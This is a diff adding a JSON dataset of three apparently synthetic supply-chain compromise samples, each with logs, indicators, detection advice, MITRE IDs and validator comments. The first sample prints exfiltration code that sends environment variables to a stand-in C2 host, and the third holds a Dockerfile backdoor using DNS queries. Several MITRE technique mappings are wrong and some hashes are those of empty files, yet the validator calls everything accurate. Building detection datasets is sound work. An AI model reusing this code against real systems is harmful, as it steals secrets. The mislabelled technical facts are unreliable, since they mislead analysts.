@@ -1,0 +1,176 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Supply Chain",
+        "nature": "third_party_software_compromise"
+      },
+      "example": {
+        "scenario": "Attackers compromised the update server of a popular open-source JavaScript library, injecting malicious code into the distributed npm package. This code exfiltrates environment variables and sends them to an attacker-controlled C2 domain during initialization.",
+        "technical_data": {
+          "package_manifest": {
+            "name": "vulnerable-lib",
+            "version": "3.2.1",
+            "integrity": "sha512-abc123...==",
+            "dependencies": {
+              "innocent-dep": "^1.0.0"
+            }
+          },
+          "malicious_code_snippet": "const http = require('http');\nconst os = require('os');\nconst exfiltrate = () => {\n  const data = encodeURIComponent(JSON.stringify({ env: process.env, hostname: os.hostname() }));\n  http.get(`http://malicious-c2.example.com/collect?data=${data}`);\n};\nexfiltrate();",
+          "package_lock_entry": {
+            "name": "vulnerable-lib",
+            "version": "3.2.1",
+            "resolved": "https://registry.npmjs.org/vulnerable-lib/-/vulnerable-lib-3.2.1.tgz",
+            "integrity": "sha512-abc123...=="
+          },
+          "network_capture_http": "GET /collect?data=%7B%22env%22%3A%7B%22PATH%22%3A%22%2Fusr%2Flocal%2Fbin%22%2C%22NODE_ENV%22%3A%22production%22%7D%2C%22hostname%22%3A%22webserver01%22%7D HTTP/1.1\r\nHost: malicious-c2.example.com\r\nUser-Agent: vulnerable-lib/3.2.1\r\nAccept: */*\r\n\r\n",
+          "npm_registry_log": "2024-05-18T14:23:45.123Z INFO publish package vulnerable-lib@3.2.1 by user devcompromised",
+          "code_signing_verification_log": "WARN 2024-05-18 14:23:46 Integrity check failed for vulnerable-lib@3.2.1: signature mismatch",
+          "sbom_record": "Component: vulnerable-lib\nVersion: 3.2.1\nSupplier: npm\nChecksum: sha512-abc123...==\nLicense: MIT\n"
+        },
+        "indicators": [
+          "Unexpected HTTP outbound connection to http://malicious-c2.example.com/collect",
+          "NPM package vulnerable-lib version 3.2.1 with failed signature verification",
+          "Presence of exfiltration code in the package main file",
+          "Registry warnings of integrity verification failures during update",
+          "SBOM mismatch for vulnerable-lib 3.2.1 compared to known-good baseline"
+        ],
+        "detection_method": "Monitor outbound HTTP connections from build and runtime environments; verify code signatures and integrity of third-party dependencies against trusted SBOMs; alert on anomalous environment variable exfiltration attempts; correlate npm publish logs with suspicious user activity.",
+        "relevant_mitre_techniques": [
+          "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1584.006 - Compromise Software Supply Chain: Compromise Software Dependencies"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a third-party software compromise within the supply chain domain. The scenario clearly describes attackers compromising the update server of a popular open-source JavaScript library to inject malicious code, aligning well with the problem nature. The technical data is comprehensive and realistic, including package manifest details, malicious code snippet, package lock entry, network capture showing exfiltration, npm registry logs indicating suspicious publishing activity, code signing verification failure, and SBOM records. The indicators effectively highlight key signs of compromise such as unexpected outbound connections, signature verification failures, presence of exfiltration code, registry warnings, and SBOM mismatches, which directly support the problem description. The detection method is thorough and aligns with recommended risk reduction strategies like monitoring outbound connections, verifying code signatures, and correlating logs. Relevant MITRE techniques are correctly identified. Overall, the sample is complete, realistic, and well-structured, providing a strong example of a third-party software compromise in the supply chain."
+      }
+    },
+    {
+      "index": 1,
+      "problem": {
+        "area": "Supply Chain",
+        "nature": "third_party_software_compromise"
+      },
+      "example": {
+        "scenario": "A malicious actor infiltrated the update mechanism of a widely-used Windows utility by injecting a trojanized DLL into the update package. The DLL is signed with a stolen code signing certificate, enabling it to bypass integrity checks and execute during software startup.",
+        "technical_data": {
+          "file_hashes": {
+            "trojanized_dll.dll": {
+              "MD5": "d41d8cd98f00b204e9800998ecf8427e",
+              "SHA1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+              "SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+            }
+          },
+          "pe_header_signature": {
+            "SignedBy": "Trusted Co. Code Signing CA",
+            "SerialNumber": "12:34:56:78:9A:BC:DE:F0:12:34:56:78:9A:BC:DE:F0",
+            "NotBefore": "2023-01-10T00:00:00Z",
+            "NotAfter": "2025-01-10T23:59:59Z",
+            "SignatureAlgorithm": "sha256RSA"
+          },
+          "update_manifest": {
+            "version": "5.4.2",
+            "files": [
+              "utility.exe",
+              "trojanized_dll.dll"
+            ],
+            "checksum": {
+              "utility.exe": "sha256:8a5e31e2d6f5c9d3f4bf42d3f6e8a9c3f8a9c3f8a9c3f8a9c3f8a9c3f8a9c3f8",
+              "trojanized_dll.dll": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+            }
+          },
+          "event_log_entries": [
+            "2024-05-20 10:15:32, Info, Windows Update: Downloaded update package 5.4.2 from update.vendor.com",
+            "2024-05-20 10:16:10, Warning, Application Start: utility.exe loaded trojanized_dll.dll from C:\\Program Files\\Vendor\\Utility\\",
+            "2024-05-20 10:16:15, Network, Outbound connection to 198.51.100.42:443, TLS Client Hello with SNI 'malicious-c2.vendor.com'"
+          ],
+          "network_traffic_tls": "TLS 1.2 Client Hello\nVersion: TLS 1.2 (0x0303)\nRandom: 4a 6f 68 6e 44 6f 65 ...\nSession ID: 00\nCipher Suites: TLS_RSA_WITH_AES_256_CBC_SHA256, ...\nExtensions:\n  server_name: malicious-c2.vendor.com",
+          "process_creation_chain": [
+            "explorer.exe -> utility.exe -> trojanized_dll.dll (loaded)"
+          ],
+          "registry_modifications": [
+            "HKLM\\Software\\Vendor\\Utility\\LastUpdate = 2024-05-20T10:15:32Z",
+            "HKCU\\Software\\Vendor\\Utility\\Config\\EnableTelemetry = 1"
+          ]
+        },
+        "indicators": [
+          "Trojanized DLL file with valid but stolen code signing certificate",
+          "Unexpected outbound TLS connection with suspicious SNI",
+          "Registry telemetry flag set post-update",
+          "Update package manifest includes unexpected DLL file",
+          "Process creation chain showing DLL injection"
+        ],
+        "detection_method": "Verify code signing certificates against revocation lists and known trusted certificates; monitor process creation chains for unsigned or unexpected DLLs loaded by critical executables; inspect TLS SNI fields for suspicious domains; audit update manifests against known baselines; monitor registry changes related to telemetry and configuration.",
+        "relevant_mitre_techniques": [
+          "T1195.001 - Supply Chain Compromise: Compromise Software Update",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1055.001 - Process Injection: Dynamic-link Library Injection"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a third-party software compromise within the supply chain domain. The scenario describes a realistic attack vector where a trojanized DLL is injected into an update package and signed with a stolen certificate, aligning well with the problem nature. The technical data is comprehensive, including file hashes, code signing details, update manifest, event logs, network traffic, process chain, and registry modifications, all supporting the scenario. Indicators clearly highlight key evidence linking the sample to the problem, such as the stolen certificate, suspicious network connections, and unexpected update contents. The detection methods and MITRE techniques are relevant and appropriate. Overall, the sample is complete, plausible, and well-documented, effectively illustrating the stated cybersecurity problem."
+      }
+    },
+    {
+      "index": 2,
+      "problem": {
+        "area": "Supply Chain",
+        "nature": "third_party_software_compromise"
+      },
+      "example": {
+        "scenario": "An attacker altered the Docker container base image in a public container registry by injecting a backdoor that listens on a high port and communicates with attacker C2 via DNS tunneling. The compromised image was pulled automatically by CI/CD pipelines, spreading the malicious code into production environments.",
+        "technical_data": {
+          "dockerfile_diff": "--- original/Dockerfile\n+++ compromised/Dockerfile\n@@ -10,6 +10,10 @@\n RUN apt-get update && apt-get install -y curl bash\n+\n+# Malicious backdoor installation\n+RUN echo '#!/bin/bash\\nwhile true; do dig @8.8.8.8 -p 53 \"$(cat /tmp/cmd.txt).malicious.com\" ; sleep 10; done &' > /usr/local/bin/backdoor.sh\n+RUN chmod +x /usr/local/bin/backdoor.sh\n+RUN /usr/local/bin/backdoor.sh &\n",
+          "container_image_manifest": {
+            "Name": "registry.example.com/library/baseimage",
+            "Tag": "latest",
+            "Digest": "sha256:9b2e8ef2cd3e2a4b2f1b6e9f3e2e5a9a7e9c8d8b7f6a5c4e3d2f1b0a9e8d7c6b",
+            "Layers": 5,
+            "Signed": false
+          },
+          "network_dns_logs": [
+            "2024-05-21T11:47:12Z query: command1.malicious.com IN TXT from 10.42.1.15",
+            "2024-05-21T11:47:22Z query: command2.malicious.com IN TXT from 10.42.1.15",
+            "2024-05-21T11:47:32Z query: status.malicious.com IN TXT from 10.42.1.15"
+          ],
+          "container_runtime_logs": [
+            "2024-05-21T11:45:00Z Container baseimage started with image sha256:9b2e8e...",
+            "2024-05-21T11:45:05Z Executed /usr/local/bin/backdoor.sh",
+            "2024-05-21T11:45:10Z Network connection: UDP 10.42.1.15:55555 -> 8.8.8.8:53"
+          ],
+          "sbom_entry": {
+            "component": "registry.example.com/library/baseimage",
+            "tag": "latest",
+            "digest": "sha256:9b2e8ef2cd3e2a4b2f1b6e9f3e2e5a9a7e9c8d8b7f6a5c4e3d2f1b0a9e8d7c6b",
+            "signature": "absent",
+            "known_good_digest": "sha256:1a2b3c4d5e6f7890abcdeffedcba0987654321fedcba0987654321fedcba0987"
+          }
+        },
+        "indicators": [
+          "Docker image SHA256 digest mismatch with known-good baseline",
+          "Presence of unauthorized /usr/local/bin/backdoor.sh script",
+          "Unusual DNS TXT queries to malicious.com from container IPs",
+          "Unsigned container image in registry",
+          "Continuous DNS queries every ~10 seconds from container"
+        ],
+        "detection_method": "Implement SBOM tracking and image signature verification in CI/CD pipelines; monitor DNS traffic from containers for anomalous TXT queries; alert on image digest mismatches; scan container layers for unauthorized scripts or binaries; monitor container runtime logs for unexpected script executions.",
+        "relevant_mitre_techniques": [
+          "T1195.003 - Supply Chain Compromise: Compromise Container Image",
+          "T1071.004 - Application Layer Protocol: DNS",
+          "T1569.002 - Process Execution: Scheduled Task/Job"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a third-party software compromise within the supply chain domain. The scenario describes an attacker injecting malicious code into a widely used Docker base image hosted in a public container registry, which aligns well with the problem nature of compromising software dependencies or update mechanisms. The technical data is comprehensive and realistic, including a Dockerfile diff showing the backdoor injection, container image manifest details with an unsigned image and digest mismatch, network DNS logs indicating suspicious DNS tunneling behavior, and container runtime logs confirming execution of the backdoor script. The SBOM entry highlights the digest mismatch and absence of signature, supporting the risk reduction strategies of SBOM tracking and signature verification. The indicators clearly explain why this sample matches the problem, pointing out digest mismatches, unauthorized scripts, unsigned images, and anomalous DNS queries. The detection methods are appropriate and cover SBOM tracking, signature verification, network monitoring, and runtime log analysis. The inclusion of relevant MITRE ATT&CK techniques further strengthens the sample's completeness and realism. Overall, the sample is well-constructed, realistic, and complete, effectively illustrating the stated cybersecurity problem."
+      }
+    }
+  ]
+}
